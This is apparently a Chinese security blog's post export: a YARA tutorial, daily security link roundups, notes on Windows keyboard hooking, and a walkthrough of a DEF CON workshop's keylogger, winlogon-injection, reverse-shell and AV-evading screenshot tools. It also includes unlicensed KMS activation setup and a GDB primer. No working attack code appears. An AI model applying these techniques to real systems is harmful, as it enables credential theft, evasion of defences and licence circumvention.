    <content type="text"><![CDATA[简介 yara工具用来帮助安全研究人员鉴别和对恶意软件进行分类的工具。我们可以通过编写规则来进行恶意软件的识别。yara 规则最新规则官方文档V3.6.3规则示例：12345678910111213rule silent_banker : banker&#123; meta: description = &quot;This is just an example&quot; thread_level = 3 in_the_wild = true strings: $a = &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125; $b = &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125; $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot; condition: $a or $b or $c&#125; 这个就是一个名为rule silent_banker的规则，其中banker是规则的tag字段(可以有多个tag)，meta字段是规则的描述信息，strings是规则字段，condition则是条件判断的字段，这个规则的意思就是只要满足了字符串或a或b或c就会命中规则。这里只是一个简单的规则，规则的创建可以使用通配符、大小写非敏感的字符串、正则表达式、特殊的操作符号等其它的特征。通过python使用yarayara语法silent-_banker叫做identifiers，是大小写敏感的且不能超过128个字符，且不能用以下的关键词，因为这些是yara的关键词123456all and any ascii at condition containsentrypoint false filesize fullword for global inimport include int8 int16 int32 int8be int16beint32be matches meta nocase not or ofprivate rule strings them true uint8 uint16uint32 uint8be uint16be uint32be wide 字符串可以是文本字符串也可以是十六进制，ascii类型的使用双引号包裹，十六进制字符串使用大括号包裹。注释语法和c语言相同。 * 三种string；1.文本类型字符串2.十六进制字符串3.正则表达式 十六进制Example12345678rule AlternativesExample1&#123; strings: $hex_string = &#123; F4 23 ( 62 B4 | 56 ) 45 &#125; condition: $hex_string&#125; validF42362B445或者F4235645 字符串Example默认是敏感的,但是可以通过nocase关键字设置成不敏感的12345678rule CaseInsensitiveTextExample&#123; strings: $text_string = &quot;foobar&quot; nocase condition: $text_string&#125; 这样Foobar, FOOBAR, and fOoBaR都会被匹配到。 宽字节的匹配一个字符占两个字节 12345678rule WideCharTextExample1&#123; strings: $wide_string = &quot;Borland&quot; wide condition: $wide_string&#125; fullword关键词rule WideCharTextExample1 1234567&#123; strings: $fullword_string = &quot;domain&quot; fullword condition: $fullword_string&#125; www.mydomain.com www.my-domain.com www.domain.com 正则表达式使用斜线包裹，而非双引号或者大括号。 123456789 rule RegExpExample1&#123; strings: $re1 = /md5: [0-9a-fA-F]&#123;32&#125;/ $re2 = /state: (on|off)/ condition: $re1 and $re2&#125; 条件判断语句Conditions可以没有特征strings但是不能没有strings字段可以设定特征出现的次数 123456789 rule CountExample&#123; strings: $a = &quot;dummy1&quot; $b = &quot;dummy2&quot; condition: #a == 6 and #b &gt; 10&#125; 偏移地址offset 123456789rule InExample&#123; strings: $a = &quot;dummy1&quot; $b = &quot;dummy2&quot; condition: $a in (0..100) and $b in (100..filesize)&#125; 特征a出现在0-0x100偏移且特征b出现在0x100之后。 文件大小12345 rule FileSizeExample&#123; condition: filesize &gt; 200KB&#125; 这个只能匹配文件，如果是运行着的程序的话，那么将永远不会匹配，因为这个时候filesize没有意义。 特定位置的数据获取PE文件的判断12345678 rule IsPE&#123; condition: // MZ signature at offset 0 and ... uint16(0) == 0x5A4D and // ... PE signature at offset stored in MZ header at 0x3C uint32(uint32(0x3C)) == 0x00004550&#125; PE文件结构中的前两个字节是DOS签名5A4D,即“MZ”。 特征集合rule OfExample1{strings: $a = &quot;dummy1&quot; $b = &quot;dummy2&quot; $c = &quot;dummy3&quot; condition: 2 of ($a,$b,$c) }满足两个特征即可 引用其他规则 1234567891011121314151617rule Rule1&#123; strings: $a = &quot;dummy1&quot; condition: $a&#125;rule Rule2&#123; strings: $a = &quot;dummy2&quot; condition: $a and Rule1&#125; 全局规则 12345global rule SizeLimit&#123; condition: filesize &lt; 2MB&#125; 规则标签方便对输出的信息进行归类。 123456789rule TagsExample1 : Foo Bar Baz&#123; ...&#125;rule TagsExample2 : Bar&#123; ...&#125; Metadata 1234567891011121314rule MetadataExample&#123; meta: my_identifier_1 = &quot;Some string data&quot; my_identifier_2 = 24 my_identifier_3 = true strings: $my_text_string = &quot;text here&quot; $my_hex_string = &#123; E2 34 A1 C8 23 FB &#125; condition: $my_text_string or $my_hex_string&#125; 模块引用 12345678910import &quot;pe&quot;rule Test&#123; strings: $a = &quot;some string&quot; condition: $a and pe.entry_point == 0x1000&#125; 文件包含 1include &quot;other.yar&quot; 其它 容易踩坑的点当扫描的是某个进程文件时候，这个时候是没有filesize属性的，也就永远不会满足的。此外还有通过文件偏移来判断PE也是不可行的。 webhttps://github.com/Tigzy/yaraeditorReference恶意软件模式匹配利器 – YARAYARA：抗击恶意代码的神兵利器PEScanneryara规则自动生成UNLEASHING YARA – PART 2教你构建自己的yara数据库yarAnalyzeryara简介及API解析两个开源恶意代码的查杀引擎 clamav yarahttp://bruteforcelab.com/yara-a-beginners-guide.htmlhttps://blog.malwarebytes.com/threat-analysis/2013/10/using-yara-to-attribute-malware/https://securityintelligence.com/signature-based-detection-with-yara/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170906安全动态]]></title>
    <url>%2F2017%2F09%2F06%2F20170906%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Struts2 S2-052 RCE分析与利用https://paper.seebug.org/383/ 使用 QL 寻找 Apache Struts 中的远程代码执行漏洞(CVE-2017-9805)https://lgtm.com/blog/apache_struts_CVE-2017-9805https://xianzhi.aliyun.com/forum/read/2067.html CSS-in-JS 打破了 JS 和 CSS 之间的边界，为 CSS 注入提供了新的攻击界面https://reactarmory.com/answers/how-can-i-use-css-in-js-securely HEVD Stack Overflow 漏洞的利用，包括对 GS stack cookies 特性的绕过https://reactarmory.com/answers/how-can-i-use-css-in-js-securely 联想笔记本（还有其他品牌）的 Synaptics 触控板驱动存在一个 Bug，每秒钟会扫描一次系统https://randomascii.wordpress.com/2017/09/05/hey-synaptics-can-you-please-stop-polling 如何 Dump 一个 Flash 芯片，来自 quarkslabhttps://blog.quarkslab.com/flash-dumping-part-i.html 恶意的 Chrome 扩展程序窃取 Roblox 游戏币，通过 Discord 发送窃取的 Cookiehttp://blog.trendmicro.com/trendlabs-security-intelligence/malicous-chrome-extensions-stealing-roblox-game-currency-sending-cookies-via-discord/ ypass macOS 10.13 内核新加的 “Secure Kernel Extension Loading” 内核模块加载保护特性https://objective-see.com/blog/blog_0x21.html MTuner - 一个可用于 Windows, PS4, PS3 上的 memory profiler、内存泄漏分析工具https://github.com/milostosic/MTuner domain_analyzer - 一个可以搜寻域名的各类信息并分析安全问题的工具https://github.com/eldraco/domain_analyzer Linux(x86)栈溢出exploit开发技巧“return-to-libc”https://mp.weixin.qq.com/s/W1lUMJHVT_6_7GYNsxWdWA DIY监控程序: 滥用Apple的Call Relay协议http://www.martinvigo.com/diy-spy-program-abusing-apple-call-relay-protocol/ Mastercard互联网网关服务：Hashing设计缺陷http://tinyhack.com/2017/09/05/mastercard-internet-gateway-service-hashing-design-flaw/ 滥用可写Windows服务https://blog.didierstevens.com/2017/09/05/abusing-a-writable-windows-service/ 通过静态分析检测Python Web应用程序中漏洞https://github.com/python-security/pyt Re-enjoying the ActiveX (and others) Fun in Chinese Customized Browsershttps://justhaifei1.blogspot.com/2017/09/re-enjoying-activex-and-others.html security things in Linux v4.13https://outflux.net/blog/archives/2017/09/05/security-things-in-linux-v4-13/ Remotely Dump Linux RAM: LiMEaidehttps://n0where.net/remotely-dump-linux-ram-limeaide/其它macOS版微信竟可以这样消息防撤回http://www.jianshu.com/p/7f65287a2e7a]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170905安全动态]]></title>
    <url>%2F2017%2F09%2F05%2F20170905%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Injecting missing methods at runtimehttps://www.hopperapp.com/blog/?p=219 利用 PasteHunter 从 Pastebin 中挖掘信息https://techanarchy.net/2017/09/hunting-pastebin-with-pastehunter/ 基于 GDB 和 PEDA 的交互式 Linux Exploit 开发环境http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf macOS 全盘镜像（Image）文件静态解析工具https://github.com/ydkhatri/mac_apt 基于 SetThreadContext 的 DLL 注入https://blogs.microsoft.co.il/pavely/2017/09/05/dll-injection-with-setthreadcontext/ 分析一个电信劫持跳转下载情色APP的案例https://www.92ez.com/?action=show&amp;id=23453 揭秘盗取“羊毛党”比特币的钓鱼攻击事件 | 一例C2服务器跟踪分析报告http://www.freebuf.com/articles/network/145985.html SDN渗透测试实践 基于Web的OSINT和主动侦察工具包 Radium-Keylogger：基于Python的多功能键盘记录器]]></content>
  </entry>
  <entry>
    <title><![CDATA[window消息钩取]]></title>
    <url>%2F2017%2F09%2F04%2Fwindow%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%2F</url>
    <content type="text"><![CDATA[原理介绍在操作系统中安装全局钩子以后，只要进程接收到可以发出钩子的消息后，全局钩子的DLL文件会被操作系统自动或者强行地加载到该进程中。主要是SetWindowsHookEx()这个API函数Hook SetWindowsHookEx( int idHook, //hook type HOOKPROC lpfn //hook procedure HINSTANCE hMOd // hook Procedure 所属的DLL句柄 DWORD dwThreadId // 想要挂钩的线程ID)钩子过程是由操作系统调用的回调函数，安装消息钩子的时候，钩子过程需要存在于某个DLL内部，且该DLL的实例句柄即是hMod.这里要注意，当dwThreadId参数被设置为0时候，则安装的是全局钩子，他会影响到运行中的所有进程。像是使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到相应进程，然后调用注册的钩子函数。 实验记录 这里练习一下WH_KEYBOARD 这个键盘钩子，记录下钩子过程的地址后面用的到,为10046f00，其实就是keyboardProc函数 附加进程-&gt;勾选debugging options中的Break on new module(dll)-&gt;运行HookMain.exe-&gt;在notepad中键盘输入-&gt;此时就有如下 如下图所示，每当notepad.exe发生键盘输入事件的时候，调试就会停在此处。总结 我觉得这张图能很好的阐释windows钩子的原理spy++是一个功能十分强大的消息钩取程序，能够查看操作系统中来往的所有消息。 在windows中SetWindowsHookEx()这个API可以轻松实现消息钩子。参考逆向工程核心原理]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170904安全动态]]></title>
    <url>%2F2017%2F09%2F04%2F20170904%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 使用RDP跳过网络隔离https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/ Malware source code databasehttps://github.com/mwsrc Radare 2 逆向框架在二进制漏洞利用中的应用https://www.megabeets.net/a-journey-into-radare-2-part-1/https://www.megabeets.net/a-journey-into-radare-2-part-2/ 1像是od和ida的结合体，有兴趣的童鞋可以实践一下，发篇文章。 恶意样本分析手册——API函数篇http://blog.nsfocus.net/malware-sample-analysis-api/ x86 架构有可能多于一种 Opcodes 对应同一条汇编指令，比如 0xCC/0xCD 0x03 都对应 int 3 指令。这篇 Blog 作者利用这个特性检测调试器的存在http://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html Windows COM 远程控制https://pentestlab.blog/2017/09/01/command-and-control-windows-com/ 《Windows for Reverse Engineers》，这篇 Paper 总结了很多 Windows 系统与逆向有关的机制和特性http://www.cse.tkk.fi/fi/opinnot/T-110.6220/2014_Reverse_Engineering_Malware_AND_Mobile_Platform_Security_AND_Software_Security/luennot-files/T1106220.pdf 利用 Numpy v1.11.0 的整数溢出漏洞实现 Python 沙箱环境的逃逸：https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5 2017年8月最佳的 5 个安全工具https://medium.com/hack-with-github/top-5-security-tools-august-2017-bbae4e155c59 Web 中的代码重用攻击：通过脚本小工具绕过跨站脚本防御措施http://sebastian-lekies.de/papers/ccs_gadgets.pdf 监视 Windows 终端活动 Part2https://www.fireeye.com/blog/threat-research/2017/08/monitoring-windows-console-activity-part-two.html 浅谈多浏览器的自动化测试http://www.freebuf.com/articles/others-articles/145586.html Use COM Object hijacking to maintain persistence——Hijack explorer.exehttps://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/ 利用 InstallUtil.exe 绕过应用白名单的文件禁止执行保护http://subt0x10.blogspot.com/2017/09/banned-file-execution-via.html EvilAbigail:Automated Linux evil maid attackhttps://github.com/GDSSecurity/EvilAbigail HomeBrew 去年下载量排名https://brew.sh/analytics/install-on-request/其它 uptime 获取主机运行 Introduction to Code Signinghttps://msdn.microsoft.com/en-us/library/ms537361(v=vs.85).aspx Authenticode签名在未签名代码中的应用详解http://bobao.360.cn/learning/detail/4341.html 为何大量网站不能抓取?爬虫突破封禁的6种常见方法【岂安低调分享】https://mp.weixin.qq.com/s?__biz=MzIxNDE4MzA4OQ==&amp;mid=2651024379&amp;idx=1&amp;sn=bd30294fb00cf22a20759503ebb0169e&amp;scene=21]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170901安全动态]]></title>
    <url>%2F2017%2F09%2F01%2F20170901%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 模板引擎的相关漏洞利用https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&amp;mid=2651903993&amp;idx=1&amp;sn=8347385192b406f1bfe50c03c22b610d&amp;chksm=84e3447cb394cd6a509562640ab9b73e09c8ae8701a9dc3589c2c45e2819da930c9e5c984ee9&amp;mpshare=1&amp;scene=23&amp;srcid=0901TU90QnMmmecbDKGCNW0E#rd BlackHat 官方陆续在 Youtube 上公开 BlackHat USA 2017 会议的视频https://www.youtube.com/channel/UCJ6q9Ie29ajGqKApbLqfBOg 1关注的小伙伴儿赶紧看一下了 Instagram 遭受数据泄露，黑客获得大量用户信息，包括私人手机号、邮箱地址等：https://www.techposts.net/instagram-suffered-data-breach-hacker-gained-contact-information/ HackSysExtremeVulnerableDriver 驱动一个任意地址写漏洞的分析和利用https://blahcat.github.io/2017/08/31/arbitrary-write-primitive-in-windows-kernel-hevd/ 澳大利亚的维多利亚洲去年被盗汽车 1.6 万辆，损失 1.7 亿美金。有位研究员打算写一个车载车牌扫描器，车辆被盗时会自动报警通知https://medium.freecodecamp.org/how-i-replicated-an-86-million-project-in-57-lines-of-code-277031330ee9 集成 Google Voice 功能的 OBi200 VOIP 网关设备固件的逆向https://randywestergren.com/reverse-engineering-obi200-google-voice-appliance-part-1/ CertReq 工具可以被用于将 Windows 系统存储的证书信息发送至远程服务器https://www.doyler.net/security-not-included/certreq-exfiltration 反调试与绕过的奇淫技巧 Mac和IOShttp://iosre.com/t/topic/9351 2000元不到，他就在某宝上整出了一套伪基站装备https://mp.weixin.qq.com/s/C0vV0l1JvlR1XnNEpo9hhA RedSnarf：用于Windows环境的渗透测试工具https://github.com/nccgroup/redsnarf 复现CVE-2017-12858http://www.hhjack.com/analysis_cve-2017-12858/ 实现 macOS 内核监控的几种方法https://paper.seebug.org/380/ 引用外部脚本的隐患及防御https://mp.weixin.qq.com/s/EFoqTCdedJrNkzMYokrm7A其它这样用每次都要在命令前输入proxychains4，比较麻烦，可以用proxychains4代理一个shell，在shell中执行的命令就会自动使用代理了，例如：proxychains4 -q /bin/bash可以把上面的命令加入到用户的.bashrc或者.bash_profile中,用户登录后自动代理一个bash shell,这就有点像全局代理了抽时间研究一下AdminLTE框架]]></content>
  </entry>
  <entry>
    <title><![CDATA[defcon-25-workshop代码解读 partII]]></title>
    <url>%2F2017%2F08%2F31%2Fdefcon-25-workshop%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%AF%BB-partII%2F</url>
    <content type="text"><![CDATA[1这个项目还是比较有意义的，里面会有一些值得借鉴的函数，比网上现找的质量好些。 11.locklogger - injects into winlogon.exe and keylogs 注入winlogon.exe以及键盘记录dll注入winlogon并进行键盘记录，这里的关键点应该是dll注入winlogon进程关于win7的session0隔离的总结 1234567使用OutputDebugStringA()函数可以将调试信息输出，然后用debugview工具进行查看。ANSI的ASCII字符集及其派生字符集（也称多字节字符集）比较旧，Unicode字符集比较新，固定以双字节表示一个字。操作字符串的API在声明时，会指定字符集。每个含有字符串的API同时有两个版本：即ANSI，Unicode。尾部带A的API是ANSI版本，带W的API是Unicode版本。例如：SetWindowTextA，是ANSI函数；而SetWindowTextW，是Unicode函数._tmain()是unicode版本的的main()VS注释与取消注释快捷键CTRL + K , CTRL + C(注释)CTRL + K , CTRL + U(取消注释) 12.puppetstrings - take a free ride into ring 0ring0层实现进程隐藏 1这个还是比较有意思的 13.ThreadContinue - injection using SetThreadContext() and NtContinue()反射型dll注入，利用SetThreadContext() and NtContinue()进行dll注入。 14.getsystem - gets system using Named Pipe impersonation利用服务管理程序sc获取system权限 1关于sc介绍可以看这里https://technet.microsoft.com/en-us/library/bb490995.aspx 15.steamroll - brute forces login credentials爆破登录信息，代码量比较大，加入了av，之前看到过一个非常简单的爆破代码，利用的是LogonUser()函数。 16.combrowser - using IE COM object to make web requests使用IE COM对象发送web请求 17.httpbrowser - using HTTP API to make web requests自己实现了一个http发包的方法。 18.toxicserpent - log all network traffic, poison, port knock C2流量日志 19.RunShellcode - run shellcode from .NET一个run shellcode的GUI小工具 c#写的 20.offsetfix - converting static analysis offsets with ASLR 21.rawhook - simple example showing function prologue hooking 22.wmiquery - shows how to look up AV using WMI使用wmi查询AV]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170831安全动态]]></title>
    <url>%2F2017%2F08%2F31%2F20170831%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[停更两天练车去了，经过近两个月的周末终于换来了驾照:D 每日安全动态 HITB GSEC CTF Win Pwn 解题全记录之 babyshellcodehttps://paper.seebug.org/378/ HITB CTF 2017 Pwn题研究http://0x48.pw/2017/08/29/0x49/ Pwnhub之奇妙的巨蟒 Writeuphttp://0x48.pw/2017/08/29/0x38/ 通过一系列挑战来循序渐进学习 ROPhttps://ropemporium.com/ 通过 NMAP 探测 SAP 服务https://erpscan.com/press-center/blog/sap-services-detection-via-nmap-probes/ Disrupting AWS S3 Logging，这篇 Blog 介绍亚马逊 AWS 云中是如何存储用户行为日志的，如果用户的云主机被攻破，攻击者能不能进一步破坏云主机的日志记录http://blog.thinkst.com/2017/08/disrupting-aws-s3-logging.html USB Malware Implicated in Fileless Attackshttp://blog.trendmicro.com/trendlabs-security-intelligence/usb-malware-implicated-fileless-attacks/ Nili - 一款集网络扫描、中间人攻击、协议逆向与 Fuzz 为一体的工具https://github.com/niloofarkheirkhah/nili Jinja2 模版注入过滤器绕过https://0day.work/jinja2-template-injection-filter-bypasses/ 大数据时代下的隐私保护https://mp.weixin.qq.com/s/Gykx7qrRUL6qgE7hT6hhPA 专注于逆向工程方向的 Rolf Rolles 和 Möbius 公开了许多他们之前的研究http://www.msreverseengineering.com/research pawn - 从基于 Intel 的工作站和笔记本电脑中提取 BIOS 固件的工具https://github.com/google/pawn 代码未写，漏洞已出—架构和设计的安全http://djt.qq.com/article/view/1555 先知XSS挑战赛 - L3m0n Writeuphttps://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484070&amp;idx=1&amp;sn=673e20a08d9ae6c3de60ca48110b920a Anti-disassembly on ARM (IDA, specifically)https://kbdsmoke.me/anti-disassembly-on-arm-ida-specifically/ 如何绕过Windows Server 2008 R2上的身份验证http://www.hackingtutorials.org/general-tutorials/bypass-authentication-windows-server-2008-r2/ DOM Based Angular Sandbox Escapes by Gareth Hayeshttps://www.youtube.com/watch?v=jlSI5aVTEIg&amp;feature=youtu.be&amp;a= PyMultitor：Python多线程Tor代理https://github.com/realgam3/pymultitor [质量局!!]HITB GSEC CTF WIN PWN解题全记录之BABYSTACKhttps://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup Oracle Java和Apache Xerces PDF/Docx服务器端拒绝服务漏洞https://blogs.securiteam.com/index.php/archives/3271 Decoding malware via simple statistical analysishttps://blog.nviso.be/2017/08/30/decoding-malware-via-simple-statistical-analysis/ Pharos Binary Static Analysis Tools Released on Github Pharos二进制静态分析工具https://insights.sei.cmu.edu/sei_blog/2017/08/pharos-binary-static-analysis-tools-released-on-github.html How To Chain Commands in Linuxhttps://n0where.net/how-to-chain-commands-in-linux/ Bug Bounty：热门航空网站上的SQLi和XSS漏洞&#x68;&#116;&#116;&#x70;&#x73;&#58;&#47;&#x2f;&#x6d;&#101;&#x64;&#x69;&#117;&#x6d;&#46;&#x63;&#111;&#x6d;&#x2f;&#x40;&#x6d;&#107;&#x68;&#105;&#122;&#x65;&#x72;&#106;&#x61;&#x76;&#x65;&#x64;&#x2f;&#115;&#113;&#108;&#105;&#x2d;&#x78;&#x73;&#x73;&#x2d;&#x76;&#117;&#x6c;&#110;&#x65;&#x72;&#97;&#98;&#x69;&#x6c;&#105;&#116;&#x69;&#x65;&#115;&#45;&#x69;&#x6e;&#45;&#x61;&#45;&#x70;&#x6f;&#x70;&#x75;&#108;&#x61;&#114;&#x2d;&#97;&#x69;&#x72;&#x6c;&#x69;&#110;&#101;&#115;&#45;&#119;&#x65;&#98;&#x73;&#x69;&#116;&#101;&#45;&#98;&#117;&#x67;&#98;&#x6f;&#117;&#x6e;&#x74;&#x79;&#x2d;&#x70;&#111;&#99;&#x2d;&#53;&#x63;&#x30;&#x64;&#x37;&#x31;&#x66;&#x39;&#x33;&#53;&#x63;&#49; Understanding Log Analysis of Web Serverhttp://www.hackingarticles.in/understanding-log-analysis-web-server/ [BBP系列二] Uber XSS via Cookiehttp://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/ Malicious GIT HTTP Serverhttps://packetstormsecurity.com/files/143965/git_submodule_command_exec.rb.txt 探索低功耗蓝牙之看我如何逆向物联网灯泡并控制它http://www.freebuf.com/articles/terminal/145528.html 逆向一款恶意Eclipse插件的经历http://www.freebuf.com/articles/web/145677.html Exploit之初识Linux下缓冲区溢出http://www.freebuf.com/column/146179.html 安全人员学习笔记——Web中间件之Tomcat篇http://www.freebuf.com/column/146169.html 花生壳黑吃黑之一：Web练手基地http://www.freebuf.com/sectool/145718.html 数字签名攻击报告：正在摧毁软件身份“信用体系”的安全危机http://bobao.360.cn/learning/detail/4333.html “大宝剑”的用法：玩玩DEFCON后渗透工具Koadichttp://www.freebuf.com/sectool/145674.html其它 python计算字符串哈希hashlib.md5(“abc”).hexdigest()]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170828安全动态&&defcon-25-workshop代码解读]]></title>
    <url>%2F2017%2F08%2F28%2F20170828%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 利用xwizard.exe加载dllhttp://www.4hou.com/technology/6969.html 安全研究人员警告：超过1700台IoT设备和相关的telnet凭据已被泄露并公开放在网上http://securityaffairs.co/wordpress/62365/iot/iot-devices-credentials-leaked.html Apple iOS &lt;=10.3.1 - Kernel Exploithttps://www.exploit-db.com/exploits/42555/ 大量服务器的登录凭证被PDF钓鱼泄露http://www.ringzerolabs.com/2017/08/large-victim-credential-server.htmlhttps://www.bilibili.com/video/av13897953/ AVPASS：可绕过Android恶意软件检测系统的工具https://github.com/sslab-gatech/avpass/blob/master/docs/README.md每日代码分享来源:https://github.com/zerosum0x0/defcon-25-workshop这里主要介绍了window后渗透以及恶意软件的开发中的一些trick，做免杀的童鞋可以重点关注一下1.asynclog - basic keylogger using GetAsyncKeyState()不同于使用钩子函数进行键盘的记录，这里使用了GetAsyncKeyState()做键盘记录，api函数在User32.dll中实现。3.hooklog 挂钩WH_KEYBOARD_LL 事件 注意要区分WH_KEYBOARD 这里的LL是low level的缩写1234区别如下：https://stackoverflow.com/questions/10718009/difference-between-wh-keyboard-and-wh-keyboard-ll简单来说就是一个需要dll一个不需要dll.这里可以通过代码了解windows的消息机制。 4.IGO pre-main execution with C++ initialization我理解的就是在main函数执行之前，会进行初始化的操作，通过编译链接运行代码，可以发现还可以在main函数之前执行我们的代码，确实和平常我们一贯的思路不一样。5.tlscallback pre-main execution with Thread Local Storage callback1这个还不是特别明白用途 tlscallback.h头文件中的魔法 6.importless - PE using WinAPI that has no imports1windows的api的“隐式”调用，这里以MessageBox函数为例。 7.printscreen - takes a screenshot by simulation of printscreen keypress屏幕截屏，过3608.screenshot - takes a screenshot using device context and GDI+还是屏幕截图，利用的是device contest和GDI+，也是过360的9.reverseshell - basic reverse TCP shell反连shell10.passfilter - password complexity filter DLL with logging通过dll注入当密码改变的时候保存修改后的密码。11.locklogger - injects into winlogon.exe and keylogs]]></content>
  </entry>
  <entry>
    <title><![CDATA[可激活windows和office的KMS服务搭建]]></title>
    <url>%2F2017%2F08%2F26%2F%E5%8F%AF%E6%BF%80%E6%B4%BBwindows%E5%92%8Coffice%E7%9A%84KMS%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[前言 碍于windows激活工具存在后门的情况，搭建一个kms服务器的方法倒是不错，也是朋友推荐的。然后网上搜索了一下。KMS(Key Management Service) .这个功能是在windows Vista中的Enterprise版本和Windows Server 2008中首次出现的一种新型产品激活机制，目的是为了Microsoft更好的“反盗版”。摘自百度 github上开源了一个kms服务器的源码，link想深入研究原理的可以分析一下源码。安装和使用 一般安装在linux服务上，我的是安装在ubuntu服务器上的，安装脚本如下https://raw.githubusercontent.com/Wind4/vlmcsd/211e463ddd71f5df884080ce98d0fc5eb369b51f/scripts/install.sh 安装完成后 vlmcsd -h 看一下所支持的命令kms 默认的端口是1688，当然也可以自定义端口，参数是 -P 这个时候可以参考说明进行激活了,注意:自定义了端口的需要在host后面加上自定义的端口https://github.com/Wind4/vlmcsd/tree/211e463ddd71f5df884080ce98d0fc5eb369b51fhttps://wwww.lvmoo.com/archives/517.html]]></content>
      <categories>
        <category>其它</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170825安全动态]]></title>
    <url>%2F2017%2F08%2F25%2F20170825%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 利用xwizard.exe加载dllhttp://www.4hou.com/technology/6969.html NativePayload_DNS - 通过 DNS 流量传输后门载荷以绕过反病毒软件的 C# 代码示例https://github.com/DamonMohammadbagher/NativePayload_DNS 物联网中的 ARM 漏洞利用https://mp.weixin.qq.com/s/VSWhMKjhq2Ge4bNvd7YBiA 由正则引起的Wecenter拒绝服务漏洞http://www.0aa.me/index.php/archives/139/ Salamandra：封闭环境中检测和定位spy microphones的工具https://github.com/eldraco/Salamandra pentest-tools：渗透测试常用脚本收集https://github.com/gwen001/pentest-tools DPAT：域密码导出可用于Hashcat破解http://bobao.360.cn/learning/detail/4313.html其它 如何设置域名的 SPF 记录https://wzyboy.im/post/865.html pe装载器http://bbs.pediy.com/thread-106310.htm]]></content>
  </entry>
  <entry>
    <title><![CDATA[linux调试工具GDB入门]]></title>
    <url>%2F2017%2F08%2F24%2Flinux%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7GDB%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[简介gdb可以用在代码调试和反汇编代码的调试 常用命令调用gdb编译需要在cc后面加 -g参数再加-o；[root@redhat home]#gdb 调试文件：启动gdb(gdb) l ：（字母l）从第一行开始列出源码(gdb) break n :在第n行处设置断点(gdb) break func：在函数func()的入口处设置断点(gdb) info break： 查看断点信息(gdb) r：运行程序(gdb) n：单步执行(gdb) c：继续运行(gdb) p 变量 ：打印变量的值(gdb) bt：查看函数堆栈(gdb) finish：退出函数(gdb) shell 命令行：执行shell命令行(gdb) set args 参数:指定运行时的参数(gdb) show args：查看设置好的参数(gdb) show paths:查看程序运行路径； set environment varname [=value] 设置环境变量。如：set env USER=hchen； show environment [varname] 查看环境变量；(gdb) cd 相当于shell的cd;(gdb)pwd ：显示当前所在目录(gdb)info program： 来查看程序的是否在运行，进程号，被暂停的原因。(gdb)clear 行号n：清除第n行的断点(gdb)delete 断点号n：删除第n个断点(gdb)disable 断点号n：暂停第n个断点(gdb)enable 断点号n：开启第n个断点(gdb)step：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的 list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12list 函数名：将显示“函数名”所在函数的源代码，如：list mainlist ：不带参数，将接着上一次 list 命令的，输出下边的内容。注意 ：如果运行list 命令得到类似如下的打印，那是因为在编译程序时没有加入 -g 选项：(gdb) list1 ../sysdeps/i386/elf/start.S: No such file or directory. in ../sysdeps/i386/elf/start.S run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。回车：重复上一条命令。set args：设置运行程序时的命令行参数，如：set args 33 55show args：显示命令行参数continue：简讯为 c ，其作用是继续运行被断点中断的程序。break：为程序设置断点。break 行号：在当前文件的“行号”处设置断点，如：break 33break 函数名：在用户定义的函数“函数名”处设置断点，如：break cb_buttoninfo breakpoints：显示当前程序的断点设置情况disable breakpoints Num：关闭断点“Num”，使其无效，其中“Num”为 info breakpoints 中显示的对应值enable breakpoints Num：打开断点“Num”，使其重新生效step：简记为 s ，单步跟踪程序，当遇到函数调用时，则进入此函数体（一般只进入用户自定义函数）。next：简记为 n，单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。stepi或nexti：单步跟踪一些机器指令。print 表达式：简记为 p 